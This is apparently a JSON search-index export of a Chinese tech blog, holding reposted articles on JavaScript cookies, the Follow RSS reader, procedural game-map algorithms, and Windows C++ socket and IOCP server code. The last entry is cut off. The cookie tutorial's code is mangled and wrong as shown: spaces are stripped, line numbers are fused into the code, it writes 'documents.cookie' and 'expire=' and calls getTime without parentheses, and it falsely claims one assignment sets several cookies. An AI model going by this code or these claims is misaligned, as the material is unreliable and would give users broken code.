{"pages":[{"title":"cookie专题","url":"/20250114/cookie-zhuan-ti/","text":"转载 javascript设置cookie ※设置cookie 每个cookie都是一个名/值对，可以把下面这样一个字符串赋值给 12document.cookie：document.cookie=&quot;userId=828&quot;; 如果要一次存储多个名/值对，可以使用分号加空格（;）隔开，例如： 1document.cookie=&quot;userId=828;userName=yaoqs&quot;; 在cookie的名或值中不能使用分号（;）、逗号（,）、等号（=）以及空格。在cookie的名中做到这点很容易，但要保存的值是不确定的。如何来存储这些值呢？方法是用escape()函数进行编码，它能将一些特殊符号使用十六进制表示，例如空格将会编码为“20%”，从而可以存储于cookie值中，而且使用此种方案还可以避免中文乱码的出现。例如： 123document.cookie=&quot;str=&quot;+escape(&quot;Iloveajax&quot;);相当于：document.cookie=&quot;str=I%20love%20ajax&quot;; 当使用escape()编码后，在取出值以后需要使用unescape()进行解码才能得到原来的cookie值。尽管document.cookie看上去就像一个属性，可以赋不同的值。但它和一般的属性不一样，改变它的赋值并不意味着丢失原来的值，例如连续执行下面两条语句： 12document.cookie=&quot;userId=828&quot;;document.cookie=&quot;userName=yaoqs&quot;; 这时浏览器将维护两个cookie，分别是userId和userName，因此给document.cookie赋值更像执行类似这样的语句： 12document.addCookie(&quot;userId=828&quot;);document.addCookie(&quot;userName=yaoqs&quot;); 事实上，浏览器就是按照这样的方式来设置cookie的，如果要改变一个cookie的值，只需重新赋值，例如： 1document.cookie=&quot;userId=929&quot;; 这样就将名为userId的cookie值设置为了929。 ※获取cookie的值 下面介绍如何获取cookie的值。cookie的值可以由document.cookie直接获得： 1var strCookie=document.cookie; 这将获得以分号隔开的多个名/值对所组成的字符串，这些名/值对包括了该域名下的所有cookie 1234document.cookie=&quot;userId=828&quot;;document.cookie=&quot;userName=yaoqs&quot;;var strCookie=document.cookie;alert(strCookie); 名称来获得指定的值，这正是处理cookie值最麻烦的一部分。用户必须自己分析这个字符串，来获取指定的cookie值，例如，要获取userId的值，可以这样实现： 123456789101112131415161718//设置两个cookiedocument.cookie=&quot;userId=828&quot;;document.cookie=&quot;userName=yaoqs&quot;;//获取cookie字符串var strCookie=document.cookie;//将多cookie切割为多个名/值对var arrCookie=strCookie.split(&quot;;&quot;);var userId;//遍历cookie数组，处理每个cookie对for(vari=0;i&lt;arrCookie.length;i++)&#123; var arr=arrCookie[i].split(&quot;=&quot;); //找到名称为userId的cookie，并返回它的值 if(&quot;userId&quot;==arr[0])&#123; userId=arr[1]; break; &#125;&#125;alert(userId); 用类似的方法，可以获取一个或多个cookie的值，其主要的技巧仍然是字符串和数组的相关操作.给cookie设置终止日期到现在为止，所有的cookie都是单会话cookie，即浏览器关闭后这些cookie将会丢失，事实上这些cookie仅仅是存储在内存中，而没有建立相应的硬盘文件。在实际开发中，cookie常常需要长期保存，例如保存用户登录的状态。这可以用下面的选项来实现： 1document.cookie=&quot;userId=828;expires=GMT_String&quot;; 其中GMT_String是以GMT格式表示的时间字符串，这条语句就是将userId这个cookie设置为GMT_String表示的过期时间，超过这个时间，cookie将消失，不可访问。例如：如果要将cookie设置为10天后过期，可以这样实现： 1234567//获取当前时间vardate=newDate();varexpireDays=10;//将date设置为10天以后的时间date.setTime(date.getTime()+expireDays*24*3600*1000);//将userId和userName两个cookie设置为10天后过期document.cookie=&quot;userId=828;userName=yaoqs;expire=&quot;+date.toGMTString(); ※删除cookie 为了删除一个cookie，可以将其过期时间设定为一个过去的时间，例如： 123456789//获取当前时间vardate=newDate();//将date设置为过去的时间date.setTime(date.getTime()-10000);//将userId这个cookie删除document.cookie=&quot;userId=828;expire=&quot;+date.toGMTString(); ※指定可访问cookie的路径 默认情况下，如果在某个页面创建了一个cookie，那么该页面所在目录中的其他页面也可以访问该cookie。如果这个目录下还有子目录，则在子目录中也可以访问。。为了控制cookie可以访问的目录，需要使用path参数设置cookie，语法如下： 1document.cookie=&quot;name=value;path=cookieDir&quot;; 其中cookieDir表示可访问cookie的目录。例如： 1document.cookie=&quot;userId=320;path=/shop&quot;; 就表示当前cookie仅能在shop目录下使用。如果要使cookie在整个网站下可用，可以将cookie_dir指定为根目录，例如： 1document.cookie=&quot;userId=320;path=/&quot;; ※指定可访问cookie的主机名 和路径类似，主机名是指同一个域下的不同主机。默认情况下，一个主机中创建的cookie在另一个主机下是不能被访问的，但可以通过domain参数来实现对其的控制，其语法格式为： 1document.cookie=&quot;name=value;domain=cookieDomain&quot;; 以google为例，要实现跨主机访问，可以写为： 1document.cookie=&quot;name=value;domain=.google.com&quot;; 这样，所有google.com下的主机都可以访问该cookie。 ※综合示例 构造通用的cookie处理函数cookie的处理过程比较复杂，并具有一定的相似性。因此可以定义几个函数来完成cookie的通用操作，从而实现代码的复用。下面列出了常用的cookie操作及其函数实现。 添加一个cookie：addCookie(name,value,expireHours) 该函数接收3个参数：cookie名称，cookie值，以及在多少小时后过期。这里约定expireHours为0时不设定过期时间，即当浏览器关闭时cookie自动消失。该函数实现如下： 123456789101112function addCookie(name,value,expireHours)&#123;var cookieString=name+&quot;=&quot;+escape(value);//判断是否设置过期时间if(expireHours&gt;0)&#123;var date=newDate();date.setTime(date.getTime+expireHours*3600*1000);cookieString=cookieString+&quot;;expire=&quot;+date.toGMTString();&#125;document.cookie=cookieString;&#125; 获取指定名称的cookie值：getCookie(name) 该函数返回名称为name的cookie值，如果不存在则返回空，其实现如下： 123456789101112131415161718function getCookie(name)&#123;var strCookie=document.cookie;var arrCookie=strCookie.split(&quot;;&quot;);for(vari=0;i&lt;arrCookie.length;i++)&#123;var arr=arrCookie[i].split(&quot;=&quot;);if(arr[0]==name)returnarr[1];&#125;return &quot;&quot;;&#125;function getCookie(cookie_name)&#123;var results=document.cookie.match(&#x27;(^|;)?&#x27;+cookie_name+&#x27;=([^;]*)(;|$)&#x27;);if(results)return(unescape(results[2]));elsereturn null;&#125; 删除指定名称的cookie：deleteCookie(name) 该函数可以删除指定名称的cookie，其实现如下： 12345function deleteCookie(name)&#123;var date=newDate();date.setTime(date.getTime()-10000);document.cookie=name+&quot;=v;expire=&quot;+date.toGMTString();&#125; 我们已经知道，在document对象中有一个cookie属性。但是Cookie又是什么？“某些Web站点在您的硬盘上用很小的文本文件存储了一些信息，这些文件就称为Cookie。”——MSIE帮助。一般来说，Cookies是CGI或类似，比HTML高级的文件、程序等创建的，但是javascript也提供了对Cookies的很全面的访问权利。 我们先要学一学Cookie的基本知识。 12 每个Cookie都是这样的：&lt; cookie名 &gt;=&lt; 值 &gt; &lt; cookie名 &gt;的限制与javascript的命名限制大同小异，少了“不能用javascript关键字”，多了“只能用可以用在URL编码中的字符”。后者比较难懂，但是只要你只用字母和数字命名，就完全没有问题了。&lt;值&gt;的要求也是“只能用可以用在URL编码中的字符”。 每个Cookie都有失效日期，一旦电脑的时钟过了失效日期，这个Cookie就会被删掉。我们不能直接删掉一个Cookie，但是可以用设定失效日期早于现在时刻的方法来间接删掉它。 每个网页，或者说每个站点，都有它自己的Cookies，这些Cookies只能由这个站点下的网页来访问，来自其他站点或同一站点下未经授权的区域的网页，是不能访问的。每一“组”Cookies有规定的总大小（大约2KB每“组”），一超过最大总大小，则最早失效的Cookie先被删除，来让新的Cookie“安家”。 现在我们来学习使用documents.cookie属性。 如果直接使用documents.cookie属性，或者说，用某种方法，例如给变量赋值，来获得documents.cookie的值，我们就可以知道在现在的文档中有多少个Cookies，每个Cookies的名字，和它的值。例如，在某文档中添加“document.write(documents.cookie)”，结果显示： 1name=yaoqs;email=yaoqs@yaoqs.com;lastvisited=index.html 这意味着，文档包含3个Cookies：name,email和lastvisited。可以看到，两个Cookies之间是用分号和空格隔开的，于是我们可以用cookieString.split(‘;’)方法得到每个Cookie分开的一个数组（先用varcookieString=documents.cookie）。 设定一个Cookie的方法是对documents.cookie赋值。与其它情况下的赋值不同，向documents.cookie赋值不会删除掉原有的Cookies，而只会增添Cookies或更改原有Cookie。赋值的格式： 1documents.cookie=&#x27;cookieName=&#x27;+escape(&#x27;cookievalue&#x27;)+&#x27;;expires=&#x27;+expirationDateObj.toGMTString(); 是不是看到头晕了呢？cookieName表示Cookie的名称，cookievalue表示Cookie的值，expirationDateObj表示储存着失效日期的日期对象名，如果不需要指定失效日期，则不需要第二行。不指定失效日期，则浏览器默认是在关闭浏览器（也就是关闭所有窗口）之后过期。 首先escape()方法：为什么一定要用？因为Cookie的值的要求是“只能用可以用在URL编码中的字符”。我们知道“escape()”方法是把字符串按URL编码方法来编码的，那我们只需要用一个“escape()”方法来处理输出到Cookie的值，用“unescape()”来处理从Cookie接收过来的值就万无一失了。而且这两个方法的最常用途就是处理Cookies。其实设定一个Cookie只是“documents.cookie=‘cookieName=cookievalue’”这么简单，但是为了避免在cookievalue中出现URL里不准出现的字符，还是用一个escape()好。 然后“expires”前面的分号：注意到就行了。是分号而不是其他。 最后toGMTString()方法：设定Cookie的时效日期都是用GMT格式的时间的，其它格式的时间是没有作用的。 现在我们来实战一下。设定一个“name=rose”的Cookie，在3个月后过期。 12345var expires=newDate();expires.setTime(expires.getTime()+3*30*24*60*60*1000);/*三个月x一个月当作30天x一天24小时x一小时60分x一分60秒x一秒1000毫秒*/documents.cookie=&#x27;name=rose;expires=&#x27;+expires.toGMTString(); 为什么没有用escape()方法？这是因为我们知道rose是一个合法的URL编码字符串，也就是说，‘rose’==escape(‘rose’)。一般来说，如果设定Cookie时不用escape()，那获取Cookie时也不用unescape()。 再来一次：编写一个函数，作用是查找指定Cookie的值。 123456789101112function getCookie(cookieName)&#123;var cookieString=documents.cookie;var start=cookieString.indexOf(cookieName+&#x27;=&#x27;);//加上等号的原因是避免在某些Cookie的值里有//与cookieName一样的字符串。if(start==-1)//找不到return null;start+=cookieName.length+1;var end=cookieString.indexOf(&#x27;;&#x27;,start);if(end==-1)returnunescape(cookieString.substring(start));returnunescape(cookieString.substring(start,end));&#125; 这个函数用到了字符串对象的一些方法，如果你不记得了（你是不是这般没记性啊），请快去查查。这个函数所有的if语句都没有带上else，这是因为如果条件成立，程序运行的都是return语句，在函数里碰上return，就会终止运行，所以不加else也没问题。该函数在找到Cookie时，就会返回Cookie的值，否则返回“null”。 现在我们要删除刚才设定的name=roseCookie。 123var expires=newDate();expires.setTime(expires.getTime()-1);documents.cookie=&#x27;name=rose;expires=&#x27;+expires.toGMTString(); 可以看到，只需要把失效日期改成比现在日期早一点（这里是早1毫秒），再用同样的方法设定Cookie，就可以删掉Cookie了。","tags":"专题 javascript"},{"title":"Follow专题","url":"/20241213/follow-zhuan-ti/","text":"※Follow App ※如何使用订阅 拿到订阅源的链接。比如小红书、博客、X、Youtube……，你想要订阅哪个博主，就打开他的主页，然后复制链接。 到 Follow 里进行搜索。 点击「+」号可以打开发现页面，在这个页面可以搜索、添加订阅源。 将复制的链接粘贴进搜索框，直接进行搜索。Follow 做的很智能，不用你自己去找 RSS 链接。 甚至你可以尝试直接搜索博主的名字，也有可能会直接搜到订阅源。 点击 Follow 进行订阅 参考文献： 给小白的 Follow 使用攻略 ※关于订阅源认证 Follow提供了三种认证方式： 内容可通过在平台或自己的网站上发布内容，获得Follow认证。 12# 本站的Follow认证内容：This message is used to verify that this feed (feedId:82626909453706240) belongs to me (userId:82624193584535552). Join me in enjoying the next generation information browser https://follow.is. 参考文献： 我的博客园Follow订阅源认证 我的CSDN博客Follow订阅源认证 描述可以将以下内容添加到需要认证的订阅源的 &lt;description&gt; 标签中 1feedId:82626909453706240+userId:82624193584535552 RSS标签可以将以下内容添加到需要认证的RSS标签中： 原理是：修改自定义模板，使用该模板文件将用于生成 feed xml 文件。 1234&lt;follow_challenge&gt; &lt;feedId&gt;82626909453706240&lt;/feedId&gt; &lt;userId&gt;82624193584535552&lt;/userId&gt;&lt;/follow_challenge&gt; 参考文献： 让Follow认证我的Hexo博客订阅源 给 Hexo 博客加上 PubSubHubbub 协议实现 RSS 实时推送 hexo-generator-feed ※定制订阅源/路由 RSSHub 是一个开源、简单易用、易于扩展的 RSS 生成器，可以给任何奇奇怪怪的内容生成 RSS 订阅源。RSSHub 借助于开源社区的力量快速发展中，目前已适配数百家网站的上千项内容。 Routes are the access paths of RSSHub. Each route contains a RSSHub rule, which tells RSSHub how to extract content from the website and generate RSS subscription. 参考文献： RSSHub 新手必看：轻松搭建你的个性化资讯源！ RSSHub Routes ※RSSHub 使用 RSSHub 为任意网址生成订阅源 RSSHub 新手必看：轻松搭建你的个性化资讯源！ ※Atom Atom协议标准中文版 RFC 5023 - The Atom Publishing Protocol","tags":""},{"title":"游戏设计制作时是否会用到类似 ACM 中的算法设计？","url":"/20240808/you-xi-she-ji-zhi-zuo-shi-shi-fou-hui-yong-dao-lei-si-acm-zhong-de-suan-fa-she-ji/","text":"转载自 游戏设计制作时是否会用到类似 ACM 中的算法设计？ - 知乎用户3ZGB97的回答 最近在做游戏，想要自动生成随机的地图，找到了一篇文章：Polygonal Map Generation for Games 这里有文章的 Flash Demo Polygon Map Generation demo（下面的图片都是转自这篇文章，不知道合适吗。） 如何生成这样的地图呢？可能是 Perlin 噪音，确实能有类似的效果，但是你 Perlin 出来的只是一堆点，看似连续，实际上离散的点，你没办法生成出区块。河流也不可能简单地生成。如何生成地图中各种区块呢？我们需要生成无限个比较随机的多边形，并且铺满整个平面。这样的多边形就是Voronoi diagram 生成这货的算法叫做 Fortune’s algorithm 。算法特别复杂 Voronoi Diagram——维诺图。这里有算法的动态演示：http://www.raymondhill.net/voronoi/rhill-voronoi.html （也有 JS 源代码Javascript-Voronoi/rhill-voronoi-core.js at master · gorhill/Javascript-Voronoi · GitHub 1718 行） 这个算法我花了很长时间才搞懂，也需要不少前置知识。实际上我也搞不懂为了避免暴露所以不细说了……但这个回答主要是想要提到这个算法。因为这个算法需要几何知识，也需要图论知识，为了实现还需要一颗AVL树或者红黑树，并且有几个麻烦的边界条件，如果有选手比赛的时候码出来就太厉害了…… 先生成随机的点，然后将随机的点稍微搞得均匀一点（Lloyd’s algorithm），就以点生成维诺图。 生成了以后，用 Perlin 函数（或者别的噪音函数）给每一个区块着色，大致的地形就出来了（还需要用一个简单的洪水填充区分海与湖。） 然后，河怎么做呢？看这些区块的交点处，随机挑选一些交点，然后按照 Perlin 函数生成的高度图用 A* 算法走出一个搜索路径，就是河了。A* 在游戏开发里面实在太常用了，如萌萌哒的岛娘所说，寻路和搜素多多少少都要用到。 Introduction to A* 文章中还讲了道路和降雨之类的。相比之下，房间的生成就简单多了。 algorithm - Procedural… house with rooms generator 最后推荐一下这个网站 Red Blob Games 里面有很多游戏里面的算法，并且呢有很多动态的实例。另外此网站的这个页面 Amit’s Game Programming Information 干货非常多，应该是这个问题的最佳答案。 比如说迷宫的十种生成算法：the { buckblogs :here }: Maze Generation: Algorithm Recap","tags":"acm"},{"title":"单线程实现同时监听多个端口（windows平台c++代码）","url":"/20240808/dan-xian-cheng-shi-xian-tong-shi-jian-ting-duo-ge-duan-kou-windows-ping-tai-c-dai-ma/","text":"转载自 单线程实现同时监听多个端口（windows平台c++代码） ※前言 多年前开发了一套网络库，底层实现采用IOCP（完成端口）。该库已在公司多个程序中应用；经过多次修改，长时间检验，已经非常稳定高效。 最近把以前的代码梳理了一下，又加进了一些新的思路。代码结构更加合理，性能也有所提升。打算将该库一些的知识点写出来，以供参考。 服务端要在多个端口监听，这种场合并不多见。但作为一个完善的网络库，似乎有必要支持此功能的。 ※传统实现方法 如果监听端口个数很少，也可以采用传统的方法。因为accept函数是阻塞的，所以要实现在n个端口监听，就需要n个线程。如果监听端口个数不多，这也不是多大问题。如果监听端口多达几十个，这种方法就有些不妥。线程也是一种资源，线程过多占用资源会增加；也会导致系统负担加重。 ※更可行的实现方法 实现方法有些曲折，需要一步一步分析；基本的原理就是将socket句柄与事件（event）相关联。Windows有相关的函数可以对多个事件监听，当某个事件被触发，就知道相应的socket有事件到达。可以对该socket做accept，因为已经确定该socket有事件了，所以accept函数会立即返回。这样就达到对多个端口同时监听的目的。 生成socket，并与某个端口绑定 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556struct LISTEN_SOCKET_INFO&#123; UINT16 listenPort; //监听端口 SOCKET listenSocket;//句柄 WSAEVENT netEvent; //socket对应事件&#125;;int IocpAccept::CreateListenInfo()&#123; //m_listListenPort存储要监听的端口；总个数不超过64个 std::vector&lt;UINT16&gt;::iterator pos = m_listListenPort.begin(); for (;pos != m_listListenPort.end();++pos) &#123; //生成socket UINT16 listenPort = *pos; LISTEN_SOCKET_INFO socketInfo; socketInfo.listenSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); socketInfo.listenPort = listenPort; //绑定端口 sockaddr_in InetAddr; InetAddr.sin_family = AF_INET; InetAddr.sin_addr.s_addr = htonl(INADDR_ANY); InetAddr.sin_port = htons(listenPort); int ret = bind(socketInfo.listenSocket, (SOCKADDR *)&amp;InetAddr, sizeof(InetAddr)); if (SOCKET_ERROR == ret) &#123; ::closesocket(socketInfo.listenSocket); //绑定失败 continue; &#125; //生成事件 socketInfo.netEvent = WSACreateEvent(); //将socket句柄与事件关联起来。只监视socket的accept和close消息 ret = WSAEventSelect(socketInfo.listenSocket, socketInfo.netEvent, FD_ACCEPT | FD_CLOSE); if (SOCKET_ERROR == ret) &#123; ::closesocket(socketInfo.listenSocket); continue; &#125; // 启动监听 ret = listen(socketInfo.listenSocket, 1000); if (SOCKET_ERROR == ret) &#123; ::closesocket(socketInfo.listenSocket); continue; &#125; m_listListenInfo.push_back(socketInfo); &#125; return 0;&#125; 该函数已将需要的数据存储在列表m_listListenInfo中。 启动监听线程，对多个事件监听 对多个事件监听用到如下函数： DWORD WSAAPI WSAWaitForMultipleEvents( DWORD cEvents, const WSAEVENT *lphEvents, BOOL fWaitAll, DWORD dwTimeout, BOOL fAlertable );该函数最多可以对64个事件做跟踪，所以一个线程最多可以对64个端口做监听。（同时对超过64个端口监听的场合非常少见。本文不考虑。） 12345678910111213141516171819202122232425262728293031323334353637383940414243444546//生成事件地址指针int nEventTotal;WSAEVENT* pEventArray = CreateNetEventArray(&amp;nEventTotal);if (nEventTotal == 0) return 0;assert(nEventTotal &lt;= WSA_MAXIMUM_WAIT_EVENTS);MSG msg;while (m_bServerStart)&#123; // 同时对多个事件做监听 DWORD index = WSAWaitForMultipleEvents(nEventTotal, pEventArray, FALSE, 10000, FALSE); if (!m_bServerStart) return 0; //查看是哪个事件触发函数返回 index = index - WSA_WAIT_EVENT_0; //客户端连接事件 if ((index != WSA_WAIT_FAILED) &amp;&amp; (index != WSA_WAIT_TIMEOUT)) &#123; //pEventArray排序与m_listListenInfo一样，所以可以根据index找到对应的socket。 //就是该socket导致函数返回 LISTEN_SOCKET_INFO socketInfo = m_listListenInfo[index]; //查看具体是什么事件导致函数返回 WSANETWORKEVENTS NetworkEvents; WSAEnumNetworkEvents(socketInfo.listenSocket, pEventArray[index], &amp;NetworkEvents); //如果是accept事件，说明有客户端连接此端口 if (NetworkEvents.lNetworkEvents == FD_ACCEPT &amp;&amp; NetworkEvents.iErrorCode[FD_ACCEPT_BIT] == 0) &#123; //这时调用accept函数，会立即返回 AcceptListenPort(socketInfo.listenSocket, socketInfo.listenPort); &#125; if (NetworkEvents.lNetworkEvents == FD_CLOSE &amp;&amp; NetworkEvents.iErrorCode[FD_CLOSE_BIT] == 0) &#123; assert(false); &#125; &#125; else &#123; //因为超时等其他原因引起函数返回 &#125;&#125; 下文accept函数调用，并不会阻塞。 1234567891011121314151617181920212223242526UINT IocpAccept::AcceptListenPort(SOCKET hListenSocket, UINT16 nListenPort)&#123; SOCKET hClient = 0; SOCKADDR_IN localAddr; int iaddrSize = sizeof(SOCKADDR_IN); hClient = accept(hListenSocket, (struct sockaddr *)&amp;localAddr, &amp;iaddrSize); if (INVALID_SOCKET == hClient) &#123; int nAccepetError = WSAGetLastError(); if (nAccepetError == WSAECONNRESET) &#123; return 1; &#125; else &#123; return 0; &#125; &#125; else &#123; //获取了一个客户端连接 OnAcceptClient(hClient, nListenPort); &#125; return 0;&#125; ※后记 同时对多个端口做监听，可能还有更好的方法。如果对几百个以上端口做监听，此方法可能就不太合适。通常情况下，对多个端口监听的场景比较少见，所以对更优化的处理方法也没深究。 代码下载地址： https://download.csdn.net/download/qq_29939347/10691921","tags":""},{"title":"采用完成端口（IOCP）实现高性能网络服务器（Windows c++版）","url":"/20240808/cai-yong-wan-cheng-duan-kou-iocp-shi-xian-gao-xing-neng-wang-luo-fu-wu-qi-windows-c-ban/","text":"转载自 采用完成端口（IOCP）实现高性能网络服务器（Windows c++版） ※前言 TCP\\IP已成为业界通讯标准。现在越来越多的程序需要联网。网络系统分为服务端和客户端，也就是c\\s模式(client \\ server)。client一般有一个或少数几个连接；server则需要处理大量连接。大部分情况下，只有服务端才特别考虑性能问题。本文主要介绍服务端处理方法，当然也可以用于客户端。 我也发表过c#版网络库。其实，我最早是从事c++ 开发，多年前就实现了对完成端口的封装。最近又把以前的代码整理一下，做了测试，也和c#版网络库做了粗略对比。总体上，还是c++ 性能要好一些。c#网络库见文章《一个高性能异步socket封装库的实现思路》。 Windows平台下处理socket通讯有多种方式；大体可以分为阻塞模式和非阻塞模式。阻塞模式下send和recv都是阻塞的。简单讲一下这两种模式处理思路。 阻塞模式：比如调用send时，把要发送的数据放到网络发送缓冲区才返回。如果这时，网络发送缓冲区满了，则需要等待更久的时间。socket的收发其实也是一种IO，和读写硬盘数据有些类似。一般来讲，IO处理速度总是慢的，不要和内存处理并列。对于调用recv，至少读取一个字节数据，函数才会返回。所以对于recv，一般用一个单独的线程处理。 非阻塞模式：send和recv都是非阻塞的；比如调用send，函数会立马返回。真正的发送结果，需要等待操作系统的再次通知。阻塞模式下一步可以完成的处理，在非阻塞模式下需要两步。就是多出的这一步，导致开发难度大大增加。高性能大并发网络服务器必须采用非阻塞模式。完成端口（IOCP）是非阻塞模式中性能最好的一种。 作者多年以前，就开始从事winsocket开发，最开始是采用c++、后来采用c#。对高性能服务器设计的体会逐步加深。人要在一定的压力下才能有所成就。最开始的一个项目是移动信令分析，所处理的消息量非常大；高峰期，每秒要处理30万条信令，占用带宽500M。无论是socket通讯还是后面的数据处理，都必须非常优化。所以从项目的开始，我就谨小慎微，对性能特别在意。项目实施后，程序的处理性能出乎意料。一台服务器可以轻松处理一个省的信令数据（项目是08年开始部署，现在的硬件性能远超当时）。程序界面如下： 题外话 通过这个项目我也有些体会：1）不要怀疑Windows的性能，不要怀疑微软的实力。有些人遇到性能问题，或是遇到奇怪的bug，总是把责任推给操作系统；这是不负责任的表现。应该反思自己的开发水平、设计思路。2）开发过程中，需要把业务吃透；业务是开发的基石。不了解业务，不可能开发出高性能的程序。所有的处理都有取舍，每个函数都有他的适应场合。有时候需要拿来主义，有时候需要从头开发一个函数。 ※目标 开发出一个完善的IOCP程序是非常困难的。怎么才能化繁为简？需要把IOCP封装；同时这个封装库要有很好的适应性，能满足各种应用场景。一个好的思路就能事半功倍。我就是围绕这两个目标展开设计。 1. 程序开发接口 socket处理本质上可以分为：读、写、accept、socket关闭等事件。把这些事件分为两类：a）读、accept、socket关闭 b）写；a类是从库中获取消息，b类是程序主动调用函数。对于a类消息可以调用如下函数： 12345678910111213141516171819202122//消息事件enum Enum_MessageType :char&#123; EN_Accept = 0, EN_Read, EN_Close, EN_Connect&#125;;//返回的数据结构class SocketMessage&#123;public: SOCKET Socket; Enum_MessageType MessageType; //当MessageType为EN_Connect时，BufferLen为EasyIocpLib_Connect函数的tag参数 INT32 BufferLen; char *Buffer;&#125;;//不停的调用此函数，返回数据SocketMessage* EasyIocpLib_GetMessage(UINT64 handle); 对于b类，就是发送数据。当调用发送时，数据被放到库的发送缓冲中，函数里面返回。接口如下： 12345678910enum EN_SEND_BUFFER_RESULT&#123; en_send_buffer_ok = 0, //放入到发送缓冲 en_not_validate_socket, //无效的socket句柄 en_send_buffer_full //发送缓冲区满&#125;;EN_SEND_BUFFER_RESULT EasyIocpLib_SendMessage(UINT64 handle, SOCKET socket, char* buffer, int offset, int len, BOOL mustSend = FALSE); 总的思路是接收时，放到接收缓冲；发送时，放到发送缓冲。外部接口只对内存中数据操作，没有任何阻塞。 2. 具有广泛的适应性 如果网络库可以用到各种场景，所处理的逻辑必须与业务无关。所以本库接收和发送的都是字节流。包协议一般有长度指示或有开始结束符。需要把字节流分成一个个完整的数据包。这就与业务逻辑有关了。所以要有分层处理思想： ※库性能测试 首先对库的性能做测试，使大家对库的性能有初步印象。这些测试都不是很严格，大体能反映程序的性能。IOCP是可扩展的，就是同时处理10个连接与同时处理1000个连接，性能上没有差别。 我的机器配置不高，cup为酷睿2 双核 E7500，相当于i3低端。 1）两台机器测试，一个发送，一个接收：带宽占用40M，整体cpu占用10%，程序占用cpu不超过3%。 2）单台机器，两个程序互发：收发数据达到30M字节，相当于300M带宽，cpu占用大概25%。 3）采用更高性能机器测试，两个程序对发数据：cpu为：i5-7500 CPU @ 3.40GHz 收发数据总和80M字节每秒，接近1G带宽。cpu占用25%。 测试程序下载地址 ：《完成端口（IOCP）性能测试程序（c++版本 64位程序）》。只有exe程序，不包括代码。 ※网络库设计思路 服务器要启动监听，当有客户端连接时，生成新的socket句柄；该socket句柄与完成端口关联，后续读写都通过完成端口完成。 socket监听（Accept处理） 关于监听处理，参考我另一篇文章《单线程实现同时监听多个端口》。 数据接收 收发数据要用到类型OVERLAPPED。需要对该类型进一步扩充，这样当从完成端口返回时，可以获取具体的数据和操作类型。这是处理完成端口一个非常重要的技巧。 1234567891011121314151617//完成端口操作类型typedef enum&#123; POST_READ_PKG, //读 POST_SEND_PKG, //写 POST_CONNECT_PKG, POST_CONNECT_RESULT&#125;OPERATION_TYPE;struct PER_IO_OPERATION_DATA&#123; WSAOVERLAPPED overlap; //第一个变量，必须是操作系统定义的结构 OPERATION_TYPE opType; SOCKET socket; WSABUF buf; //要读取或发送的数据&#125;; 发送处理：overlap包含要发送的数据。调用此函数会立马返回；当有数据到达时，会有通知。 123456789101112131415161718192021222324252627282930BOOL NetServer::PostRcvBuffer(SOCKET socket, PER_IO_OPERATION_DATA *overlap)&#123; DWORD flags = MSG_PARTIAL; DWORD numToRecvd = 0; overlap-&gt;opType = OPERATION_TYPE::POST_READ_PKG; overlap-&gt;socket = socket; int ret = WSARecv(socket, &amp;overlap-&gt;buf, 1, &amp;numToRecvd, &amp;flags, &amp;(overlap-&gt;overlap), NULL); if (ret != 0) &#123; if (WSAGetLastError() == WSA_IO_PENDING) &#123; ret = NO_ERROR; &#125; else &#123; ret = SOCKET_ERROR; &#125; &#125; return (ret == NO_ERROR);&#125; 从完成端口获取读数据事件通知： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687DWORD NetServer::Deal_CompletionRoutine()&#123; DWORD dwBytesTransferred; PER_IO_OPERATION_DATA *lpPerIOData = NULL; ULONG_PTR Key; BOOL rc; int error; while (m_bServerStart) &#123; error = NO_ERROR; //从完成端口获取事件 rc = GetQueuedCompletionStatus( m_hIocp, &amp;dwBytesTransferred, &amp;Key, (LPOVERLAPPED *)&amp;lpPerIOData, INFINITE); if (rc == FALSE) &#123; error = 123; if (lpPerIOData == NULL) &#123; DWORD lastError = GetLastError(); if (lastError == WAIT_TIMEOUT) &#123; continue; &#125; else &#123; //continue; //程序结束 assert(false); return lastError; &#125; &#125; else &#123; if (GetNetResult(lpPerIOData, dwBytesTransferred) == FALSE) &#123; error = WSAGetLastError(); &#125; &#125; &#125; if (lpPerIOData != NULL) &#123; switch (lpPerIOData-&gt;opType) &#123; case POST_READ_PKG: //读函数返回 &#123; OnIocpReadOver(*lpPerIOData, dwBytesTransferred, error); &#125; break; case POST_SEND_PKG: &#123; OnIocpWriteOver(*lpPerIOData, dwBytesTransferred, error); &#125; break; &#125; &#125; &#125; return 0;&#125;void NetServer::OnIocpReadOver(PER_IO_OPERATION_DATA&amp; opData, DWORD nBytesTransfered, DWORD error)&#123; if (error != NO_ERROR || nBytesTransfered == 0)//socket出错 &#123; Net_CloseSocket(opData.socket); NetPool::PutIocpData(&amp;opData);//数据缓冲处理 &#125; else &#123; OnRcvBuffer(opData, nBytesTransfered);//处理接收到的数据 BOOL post = PostRcvBuffer(opData.socket, &amp;opData); //再次读数据 if (!post) &#123; Net_CloseSocket(opData.socket); NetPool::PutIocpData(&amp;opData); &#125; &#125;&#125; 数据发送 数据发送时，先放到发送缓冲，再发送。向完成端口投递时，每个连接同时只能有一个正在投递的操作。 1234567891011121314151617181920212223242526272829BOOL NetServer::PostSendBuffer(SOCKET socket)&#123; if (m_clientManage.IsPostSendBuffer(socket)) //如果有正在执行的投递，不能再次投递 return FALSE; //获取要发送的数据 PER_IO_OPERATION_DATA *overlap = NetPool::GetIocpData(FALSE); int sendCount = m_clientManage.GetSendBuf(socket, overlap-&gt;buf); if (sendCount == 0) &#123; NetPool::PutIocpData(overlap); return FALSE; &#125; overlap-&gt;socket = socket; overlap-&gt;opType = POST_SEND_PKG; BOOL post = PostSendBuffer(socket, overlap); if (!post) &#123; Net_CloseSocket(socket); NetPool::PutIocpData(overlap); return FALSE; &#125; else &#123; m_clientManage.SetPostSendBuffer(socket, TRUE); return TRUE; &#125;&#125; ※总结 开发一个好的封装库必须有的好的思路。对复杂问题要学会分解，每个模块功能合理，适应性要强；要有模块化、层次化处理思路。如果网络库也处理业务逻辑，处理具体包协议，它就无法做到通用性。一个通用性好的库，才值得我们花费大气力去做好。我设计的这个库，用在了公司多个系统上；以后无论遇到任何网络协议，这个库都可以用得上，一劳永逸的解决网络库封装问题。","tags":"iocp c++"},{"title":"使用C#开发pdf阅读器初探（基于WPF，没有使用开源库）","url":"/20240808/shi-yong-c-kai-fa-pdf-yue-du-qi-chu-tan-ji-yu-wpf-mei-you-shi-yong-kai-yuan-ku/","text":"转载自 